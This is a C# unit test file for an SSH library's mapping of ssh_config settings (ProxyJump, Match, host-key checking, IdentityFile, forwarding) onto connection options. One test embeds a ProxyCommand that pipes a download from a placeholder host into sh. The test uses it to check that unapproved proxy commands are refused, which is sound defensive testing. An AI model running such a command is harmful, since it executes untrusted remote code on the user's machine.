// SPDX-License-Identifier: MIT
// Copyright 2026 VelaShell Labs
//
// 被测规格: velashell-docs/zh/ssh/spec/09-dialing.md §7 —— ssh_config 要能直接变成连接参数，否则解析只是摆设。

using VelaShell.Ssh.Channels;
using VelaShell.Ssh.Config;
using VelaShell.Ssh.Diagnostics;
using VelaShell.Ssh.Forwarding;
using VelaShell.Ssh.HostKeys;
using VelaShell.Ssh.Protocol;
using VelaShell.Ssh.Session;
using VelaShell.Ssh.Transport;

namespace VelaShell.Ssh.Tests.Config;

[TestClass]
public sealed class SshConfigConnectTests
{
    /// <summary>
    /// 〔FW-E2〕<c>HostName</c> 里的 <c>%h</c> 换成输入的名字（<c>Host *.prod</c> 配 <c>HostName %h.example.com</c>），
    /// <c>%%</c> 换成 <c>%</c>。曾经建连拿字面量 <c>%h.example.com</c> 去连。
    /// </summary>
    [TestMethod]
    public async Task HostName里的百分号h在建连时展开()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host *.prod
                HostName %h.example.com
            Host odd
                HostName odd%%name
            """);

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "db1.prod");
        Assert.AreEqual("db1.prod.example.com", options.Host);

        Assert.AreEqual("odd%name", SshConfigFile.Resolve(blocks, "odd").HostName);
    }

    [TestMethod]
    public async Task 连接层的各项都落到连接参数上()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host web
                HostName 10.0.0.9
                Port 2222
                User deploy
                Compression yes
                ServerAliveInterval 15
                ServerAliveCountMax 4
                ConnectTimeout 7
            """);

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web");

        Assert.AreEqual("deploy", options.UserName);
        Assert.AreEqual("10.0.0.9", options.Host);
        Assert.AreEqual(2222, options.Port);
        Assert.AreSequenceEqual([SshAlgorithmNames.None], [.. options.Algorithms.CompressionClientToServer]);
        Assert.AreSequenceEqual([SshAlgorithmNames.None], [.. options.Algorithms.CompressionServerToClient]);
        Assert.AreEqual(TimeSpan.FromSeconds(15), options.KeepAlive.Interval);
        Assert.AreEqual(4, options.KeepAlive.MaxMissed);
        Assert.AreEqual(TimeSpan.FromSeconds(7), options.ConnectTimeout);
        Assert.IsInstanceOfType<TcpTransportDialer>(options.Dialer);
    }

    [TestMethod]
    public async Task ProxyJump按同一份配置解析每个跳板()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host target
                HostName 10.1.2.3
                ProxyJump bastion,inner
            Host bastion
                HostName bastion.example.com
                User ops
                Port 2200
            Host inner
                HostName 10.1.0.1
                User jumper
            """);

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(
            blocks, "target", new SshConfigConnectOptions { DefaultUserName = "me" });

        // 目标经 inner；inner 经 bastion；bastion 直连。
        var last = (SshJumpDialer)options.Dialer;
        Assert.AreEqual("10.1.0.1", last.JumpHost.Host);
        Assert.AreEqual("jumper", last.JumpHost.UserName);

        var first = (SshJumpDialer)last.JumpHost.Dialer;
        Assert.AreEqual("bastion.example.com", first.JumpHost.Host);
        Assert.AreEqual(2200, first.JumpHost.Port);
        Assert.AreEqual("ops", first.JumpHost.UserName);
        Assert.IsInstanceOfType<TcpTransportDialer>(first.JumpHost.Dialer);

        Assert.AreEqual("me", options.UserName, "目标没写 User 时用调用方给的默认用户名");
    }

    /// <summary>
    /// 建连路径上 <c>Match localuser</c> 照本机用户名判；跳板规格里写明的用户交给 <c>Match user</c>；目标的远端用户判不了，不匹配。
    /// 曾经只给主机名，<c>localuser</c> 永远判不了。
    /// </summary>
    [TestMethod]
    public async Task 建连时Match_localuser按本机用户判_跳板写明的用户交给Match_user()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
            Match host target localuser "{Environment.UserName}"
                Port 2201
            Match host other localuser nobody-at-all
                Port 2202
            Match host bastion user alice
                Port 2203
            Match host target user alice
                Port 2204
            Host target
                ProxyJump alice@bastion
            """);

        SshConnectionOptions target = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target");
        Assert.AreEqual(2201, target.Port);
        Assert.AreEqual(2203, ((SshJumpDialer)target.Dialer).JumpHost.Port, "跳板写明了 alice@，Match user alice 对那一跳成立");

        SshConnectionOptions other = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "other");
        Assert.AreEqual(22, other.Port, "本机用户对不上");
    }

    [TestMethod]
    public async Task 跳板规格里显式的用户与端口优先()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host target
                ProxyJump alice@bastion:2022
            Host bastion
                User ops
                Port 22
            """);

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target");

        var jump = (SshJumpDialer)options.Dialer;
        Assert.AreEqual("alice", jump.JumpHost.UserName);
        Assert.AreEqual(2022, jump.JumpHost.Port);
    }

    /// <summary>
    /// 〔FW-E12〕ProxyJump 链里第一跳之后的跳板经前一跳到达：它们自己的 ProxyJump / ProxyCommand 不去解析。
    /// 曾经先解析一遍再丢掉：白批准一次 ProxyCommand（没给批准回调时整个连接直接失败），用不上的那条链里有环也报错。
    /// </summary>
    [TestMethod]
    public async Task 第二跳及以后的跳板不解析自己的拨号设置()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host target
                ProxyJump a,b
            Host b
                ProxyCommand nc %h %p
            Host a
                ProxyJump none
            Host c
                ProxyJump a,d
            Host d
                ProxyJump c
            """);

        // 没给 ApproveProxyCommand：b 的 ProxyCommand 用不上，不该去要批准。
        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target");
        var last = (SshJumpDialer)options.Dialer;
        Assert.AreEqual("b", last.JumpHost.Host);
        Assert.IsInstanceOfType<SshJumpDialer>(last.JumpHost.Dialer, "b 经 a 到达");

        // d 自己的 ProxyJump 指回 c（会成环），但 d 经 a 到达，那条链用不上，不报环。
        _ = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "c");
    }

    /// <summary>
    /// 〔FW-E12〕Host *.corp 带出来的 ProxyJump 落到跳板自己身上（跳板忘了写 ProxyJump none）：跳板直连，不报「链有环」。
    /// </summary>
    [TestMethod]
    public async Task 跳板的ProxyJump指向自己时当成直连()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host *.corp
                ProxyJump bastion.corp
            """);

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "app.corp");

        var jump = (SshJumpDialer)options.Dialer;
        Assert.AreEqual("bastion.corp", jump.JumpHost.Host);
        Assert.IsInstanceOfType<TcpTransportDialer>(jump.JumpHost.Dialer, "跳板自己直连");
    }
    /// <summary>〔FW-E14〕端口配得不对（越界、带符号、不是数字）：建连时报配置错误、说清是哪台主机；Port 属性交出 22。</summary>
    [TestMethod]
    [DataRow("-1")]
    [DataRow("0")]
    [DataRow("99999")]
    [DataRow("ssh")]
    public async Task 端口配得不对时报配置错误(string port)
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
            Host web
                Port {port}
            Host via
                ProxyJump web:{port}
            """);

        Assert.AreEqual(22, SshConfigFile.Resolve(blocks, "web").Port);

        SshConnectException error = await Assert.ThrowsExactlyAsync<SshConnectException>(
            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web"));
        Assert.AreEqual(SshFailureReason.InvalidConfiguration, error.Reason);
        Assert.Contains("web", error.Message);
    }

    /// <summary>〔FW-E14〕ProxyJump 规格里的端口越界：同样报配置错误。</summary>
    [TestMethod]
    public async Task 跳板规格里的端口越界时报配置错误()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host target
                ProxyJump bastion:70000
            """);

        SshConnectException error = await Assert.ThrowsExactlyAsync<SshConnectException>(
            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target"));
        Assert.AreEqual(SshFailureReason.InvalidConfiguration, error.Reason);
        Assert.Contains("70000", error.Message);
    }

    [TestMethod]
    public async Task 跳板链有环时明确报错()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host a
                ProxyJump b
            Host b
                ProxyJump a
            """);

        SshConnectException ex = await Assert.ThrowsExactlyAsync<SshConnectException>(
            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "a"));
        Assert.Contains("环", ex.Message);
    }

    [TestMethod]
    public async Task ProxyCommand变成代理命令拨号器且ProxyJump优先()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host viacmd
                User joe
                ProxyCommand nc -x proxy:1080 %h %p
            Host both
                ProxyCommand nc %h %p
                ProxyJump bastion
            Host none
                ProxyCommand none
            """);

        List<SshProxyCommandRequest> asked = [];
        SshConfigConnectOptions approveAll = new()
        {
            ApproveProxyCommand = (request, _) =>
            {
                asked.Add(request);
                return ValueTask.FromResult(true);
            },
        };

        SshConnectionOptions viaCommand = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "viacmd", approveAll);
        var command = (ProxyCommandDialer)viaCommand.Dialer;
        Assert.AreEqual("nc -x proxy:1080 %h %p", command.CommandTemplate);
        Assert.AreEqual("joe", command.UserName);

        // 批准的是展开之后、将要执行的那一行。
        SshProxyCommandRequest request = Assert.ContainsSingle(asked);
        Assert.AreEqual("viacmd", request.Host);
        Assert.AreEqual("nc -x proxy:1080 viacmd 22", request.Command);

        SshConnectionOptions both = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "both", approveAll);
        Assert.IsInstanceOfType<SshJumpDialer>(both.Dialer);
        Assert.HasCount(1, asked, "ProxyJump 压过 ProxyCommand 时那条命令用不上，也就不问");

        SshConnectionOptions none = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "none");
        Assert.IsInstanceOfType<TcpTransportDialer>(none.Dialer);
    }

    [TestMethod]
    public async Task 配置里的ProxyCommand没被批准就不执行_也不悄悄直连()
    {
        // 与 Match exec 同一条理由：配置文件常常是从别处拷来的，
        // 一行 Host * 加一行 ProxyCommand 就是「连任何一台主机都先在本机跑一个程序」。
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host *
                ProxyCommand curl -s https://example.invalid/x | sh
            """);

        SshConnectException noApprover = await Assert.ThrowsExactlyAsync<SshConnectException>(
            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web"));
        Assert.AreEqual(SshFailureReason.InvalidConfiguration, noApprover.Reason);
        Assert.Contains("ApproveProxyCommand", noApprover.Message);

        SshConnectException denied = await Assert.ThrowsExactlyAsync<SshConnectException>(
            async () => await SshConfigFile.CreateConnectionOptionsAsync(
                blocks, "web", new SshConfigConnectOptions { ApproveProxyCommand = (_, _) => ValueTask.FromResult(false) }));
        Assert.AreEqual(SshFailureReason.InvalidConfiguration, denied.Reason);
    }

    [TestMethod]
    public async Task 主机密钥检查的映射()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host strict
                StrictHostKeyChecking yes
            Host tofu
                StrictHostKeyChecking accept-new
                UserKnownHostsFile ~/.ssh/known_hosts_tofu
            """);

        SshConnectionOptions strict = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "strict");
        Assert.AreEqual(UnknownHostBehavior.Reject, ((KnownHostsPolicy)strict.HostKeyPolicy).UnknownHost);

        SshConnectionOptions tofu = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "tofu");
        Assert.AreEqual(UnknownHostBehavior.AcceptAndPersist, ((KnownHostsPolicy)tofu.HostKeyPolicy).UnknownHost);

        // 什么都没配：用调用方给的策略。
        DangerousAcceptAnyHostKeyPolicy given = new();
        SshConnectionOptions plain = await SshConfigFile.CreateConnectionOptionsAsync(
            blocks, "other", new SshConfigConnectOptions { HostKeyPolicy = given });
        Assert.AreSame(given, plain.HostKeyPolicy);
    }

    /// <summary>〔FW-E13〕UserKnownHostsFile 里的 %h / %r 照这台主机与用户展开（曾经代入空串，所有主机挤进同一个文件）。</summary>
    [TestMethod]
    public async Task UserKnownHostsFile里的百分号记号照主机与用户展开()
    {
        string directory = Path.Combine(Path.GetTempPath(), $"velashell-kh-{Guid.NewGuid():N}");
        Directory.CreateDirectory(directory);
        try
        {
            IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
                Host web
                    HostName web.example.com
                    User deploy
                    StrictHostKeyChecking accept-new
                    UserKnownHostsFile {directory}/kh_%h_%r
                """);

            SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web");

            using var signer = Ssh.Auth.InMemorySshSigner.GenerateEd25519();
            await options.HostKeyPolicy.PersistAsync(new SshHostKeyContext
            {
                Host = "web.example.com",
                Port = 22,
                Key = signer.PublicKey,
                NegotiatedAlgorithm = SshAlgorithmNames.SshEd25519,
            });

            Assert.IsTrue(File.Exists(Path.Combine(directory, "kh_web.example.com_deploy")), "known_hosts 应当写到展开之后的路径");
            Assert.IsFalse(File.Exists(Path.Combine(directory, "kh__")));
        }
        finally
        {
            Directory.Delete(directory, recursive: true);
        }
    }

    [TestMethod]
    public async Task UserKnownHostsFile为none时不读也不写()
    {
        // 曾经把 none、/dev/null 当成路径：在当前目录里读写一个叫 none 的文件。
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host n
                StrictHostKeyChecking accept-new
                UserKnownHostsFile none
            """);

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "n");
        var policy = (KnownHostsPolicy)options.HostKeyPolicy;

        using var signer = Ssh.Auth.InMemorySshSigner.GenerateEd25519();
        SshHostKeyContext context = new()
        {
            Host = "n.example.com",
            Port = 22,
            Key = signer.PublicKey,
            NegotiatedAlgorithm = SshAlgorithmNames.SshEd25519,
        };

        Assert.AreEqual(SshHostKeyVerdict.AcceptAndPersist, await policy.EvaluateAsync(context));
        string stray = Path.GetFullPath("none");
        bool existedBefore = File.Exists(stray);
        await policy.PersistAsync(context);
        Assert.AreEqual(existedBefore, File.Exists(stray), "不该在当前目录里写出一个叫 none 的文件");
    }

    [TestMethod]
    public async Task 询问或缺省时用调用方给的策略()
    {
        // ask 与缺省都是「交互式」—— 调用方带着自己的信任库与询问界面，不能因为配置里写了
        // UserKnownHostsFile 就被另起的一个策略顶替掉。
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host a
                StrictHostKeyChecking ask
                UserKnownHostsFile ~/.ssh/other_known_hosts
            Host b
                UserKnownHostsFile ~/.ssh/other_known_hosts
            """);
        DangerousAcceptAnyHostKeyPolicy given = new();
        SshConfigConnectOptions settings = new() { HostKeyPolicy = given };

        Assert.AreSame(given, (await SshConfigFile.CreateConnectionOptionsAsync(blocks, "a", settings)).HostKeyPolicy);
        Assert.AreSame(given, (await SshConfigFile.CreateConnectionOptionsAsync(blocks, "b", settings)).HostKeyPolicy);
    }

    [TestMethod]
    public async Task 跳板拿不到为目标准备的口令()
    {
        // 调用方给的口令是为目标准备的。曾经每一跳都拿到同一份凭据 —— 目标的口令就这样交给了跳板。
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host target
                ProxyJump jump
            """);

        using var agentKey = Ssh.Auth.InMemorySshSigner.GenerateEd25519();
        SshConfigConnectOptions settings = new()
        {
            Credentials = [new Ssh.Auth.PasswordCredential("目标的口令"), new Ssh.Auth.PublicKeyCredential(agentKey)],
        };

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target", settings);
        SshConnectionOptions jump = ((SshJumpDialer)options.Dialer).JumpHost;

        Assert.Contains(c => c is Ssh.Auth.PasswordCredential, options.Credentials, "目标照常拿到口令");
        Assert.DoesNotContain(c => c is Ssh.Auth.PasswordCredential, jump.Credentials, "跳板拿不到目标的口令");
        Assert.Contains(c => c is Ssh.Auth.PublicKeyCredential, jump.Credentials, "公钥凭据照常给跳板");
    }

    [TestMethod]
    public async Task 读不出来的IdentityFile只跳过它自己()
    {
        string good = Path.Combine(AppContext.BaseDirectory, "Keys", "Fixtures", "ed25519-plain");
        string bad = Path.Combine(Path.GetTempPath(), $"velashell-badkey-{Guid.NewGuid():N}");
        await File.WriteAllTextAsync(bad, "-----BEGIN OPENSSH PRIVATE KEY-----\n这不是私钥\n-----END OPENSSH PRIVATE KEY-----\n");

        try
        {
            IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
                Host k
                    IdentityFile {bad}
                    IdentityFile {good}
                """);

            List<string> skipped = [];
            SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(
                blocks, "k", new SshConfigConnectOptions { IdentityFileSkipped = (path, _) => skipped.Add(path) });

            Assert.HasCount(1, options.Credentials, "坏的那把跳过，好的那把照常用");
            Assert.AreSequenceEqual([bad], skipped, "跳过要有个说法");
        }
        finally
        {
            File.Delete(bad);
        }
    }

    [TestMethod]
    public async Task 跳板与目标共用的加密私钥只解一次只问一次口令()
    {
        // 曾经每一跳各读一遍：加密的钥每一跳都重跑一遍 KDF，口令也每一跳问一次。
        string key = Path.Combine(AppContext.BaseDirectory, "Keys", "Fixtures", "ed25519-aes256ctr");
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
            Host target
                ProxyJump jump
            Host *
                IdentityFile {key}
            """);

        int asked = 0;
        SshConfigConnectOptions settings = new()
        {
            PassphraseProvider = (_, _) =>
            {
                asked++;
                return ValueTask.FromResult<string?>("correct horse battery staple");
            },
        };

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target", settings);
        SshConnectionOptions jump = ((SshJumpDialer)options.Dialer).JumpHost;

        Assert.AreEqual(1, asked, "同一把钥在一次解析里只问一次口令");
        var targetKey = (Ssh.Auth.PublicKeyCredential)options.Credentials.Single();
        var jumpKey = (Ssh.Auth.PublicKeyCredential)jump.Credentials.Single();
        Assert.AreSame(targetKey.Signer, jumpKey.Signer, "跳板与目标用的是同一个解好的签名器");
    }

    [TestMethod]
    public async Task IdentityFile读成凭据且不存在的文件跳过()
    {
        string key = Path.Combine(AppContext.BaseDirectory, "Keys", "Fixtures", "ed25519-plain");
        Assert.IsTrue(File.Exists(key), "测试夹具不在输出目录里");

        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
            Host k
                IdentityFile {key}
                IdentityFile ~/.ssh/definitely-not-here-{Guid.NewGuid():N}
            """);

        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "k");

        Assert.HasCount(1, options.Credentials);
        Assert.AreEqual("publickey", options.Credentials[0].MethodName);
    }

    [TestMethod]
    public void ForwardX11Timeout落到X11选项的有效期上()
    {
        // ssh_config(5) 的 ForwardX11Timeout：时间格式，0 为整条连接期间都有效。
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host long
                ForwardX11 yes
                ForwardX11Timeout 1h30m
            Host forever
                ForwardX11 yes
                ForwardX11Timeout 0
            Host typo
                ForwardX11 yes
                ForwardX11Timeout 20 minutes
            Host unset
                ForwardX11 yes
            """);

        TimeSpan? Timeout(string host) => SshConfigFile.Resolve(blocks, host).ApplyToShell().X11Forwarding?.Timeout;

        Assert.AreEqual(TimeSpan.FromMinutes(90), Timeout("long"));
        Assert.AreEqual(System.Threading.Timeout.InfiniteTimeSpan, Timeout("forever"));
        Assert.AreEqual(X11ForwardOptions.Default.Timeout, Timeout("typo"), "写不对的值不猜，沿用默认");
        Assert.AreEqual(X11ForwardOptions.Default.Timeout, Timeout("unset"));
    }

    [TestMethod]
    [DataRow("45", 45)]
    [DataRow("45s", 45)]
    [DataRow("10m", 600)]
    [DataRow("2H", 7200)]
    [DataRow("1d", 86400)]
    [DataRow("1w", 604800)]
    [DataRow("1h30m", 5400)]
    [DataRow("0", 0)]
    public void Ssh_config的时间格式按单位相加(string text, int seconds)
    {
        Assert.IsTrue(SshHostConfig.TryParseTimeSpec(text, out TimeSpan value), text);
        Assert.AreEqual(TimeSpan.FromSeconds(seconds), value, text);
    }

    [TestMethod]
    [DataRow("")]
    [DataRow("m")]
    [DataRow("10x")]
    [DataRow("-5")]
    [DataRow("1.5h")]
    [DataRow("20 minutes")]
    [DataRow("99999999999999999999w")]
    public void Ssh_config的时间格式写不对就不认(string text) => Assert.IsFalse(SshHostConfig.TryParseTimeSpec(text, out _), text);

    [TestMethod]
    public void 会话项落到shell参数上()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host gui
                ForwardAgent yes
                ForwardX11 yes
                ForwardX11Trusted yes
            """);

        SshShellOptions shell = SshConfigFile.Resolve(blocks, "gui").ApplyToShell();

        Assert.IsNotNull(shell.AgentForwarding);
        Assert.IsNotNull(shell.X11Forwarding);
        Assert.IsTrue(shell.X11Forwarding.IsTrusted);

        // §7.5.8：连接级开关打开的 X11 是尽力而为的 —— 失败不该让 shell 起不来。
        Assert.AreEqual(ForwardFailureMode.Continue, shell.X11Forwarding.FailureMode);
        Assert.AreEqual(ForwardFailureMode.Continue, shell.AgentForwarding.FailureMode, "ForwardAgent yes 同理");
    }

    [TestMethod]
    [ResourceLock(WellKnownResources.EnvironmentVariables)]
    public void ForwardAgent的四种写法()
    {
        // ssh_config(5)：yes / no / agent 套接字路径 / $环境变量。曾经只认 yes，写了路径的配置被当成 no。
        static AgentForwardOptions? Agent(string value) =>
            SshConfigFile.Resolve(SshConfigFile.Parse($"Host h\n    ForwardAgent {value}"), "h").ApplyToShell().AgentForwarding;

        Assert.IsNull(Agent("no"));
        Assert.IsNull(Agent("NO"));

        AgentForwardOptions? yes = Agent("Yes");
        Assert.IsNotNull(yes);
        Assert.IsNull(yes.AgentEndpoint, "yes 转发默认的 agent");
        Assert.AreEqual(ForwardFailureMode.Continue, yes.FailureMode, "连接级开关打开的，失败不该让 shell 起不来");

        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        Assert.AreEqual(home + "/.1password/agent.sock", Agent("~/.1password/agent.sock")?.AgentEndpoint);

        string variable = $"VELASHELL_TEST_AGENT_{Guid.NewGuid():N}";
        Environment.SetEnvironmentVariable(variable, "/run/user/1000/other-agent.sock");
        try
        {
            Assert.AreEqual("/run/user/1000/other-agent.sock", Agent("$" + variable)?.AgentEndpoint);
        }
        finally
        {
            Environment.SetEnvironmentVariable(variable, null);
        }

        // 变量没设：没有可转发的 agent，宣告出去只会让远端白连一次。
        Assert.IsNull(Agent("$" + variable));
    }

    [TestMethod]
    public void 模板里调用方给的X11选项保持严格()
    {
        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
            Host gui
                ForwardX11 yes
            """);

        X11ForwardOptions explicitX11 = new() { IsTrusted = true };
        SshShellOptions shell = SshConfigFile.Resolve(blocks, "gui")
            .ApplyToShell(new SshShellOptions { X11Forwarding = explicitX11 });

        Assert.AreSame(explicitX11, shell.X11Forwarding, "模板里显式设了的不会被覆盖");
        Assert.AreEqual(ForwardFailureMode.Fail, shell.X11Forwarding!.FailureMode);
    }

    [TestMethod]
    public void 跳板规格的各种写法()
    {
        Assert.AreEqual(new SshProxyJumpHop(null, "host", null), SshConfigFile.ParseJumpSpec("host"));
        Assert.AreEqual(new SshProxyJumpHop("u", "host", 2222), SshConfigFile.ParseJumpSpec("u@host:2222"));
        Assert.AreEqual(new SshProxyJumpHop("u", "::1", 22), SshConfigFile.ParseJumpSpec("u@[::1]:22"));
        Assert.AreEqual(new SshProxyJumpHop("u", "host", 2222), SshConfigFile.ParseJumpSpec("ssh://u@host:2222"));
        Assert.HasCount(2, SshConfigFile.ParseProxyJump("a, u@b:2200"));
        Assert.IsEmpty(SshConfigFile.ParseProxyJump("none"));
    }
}
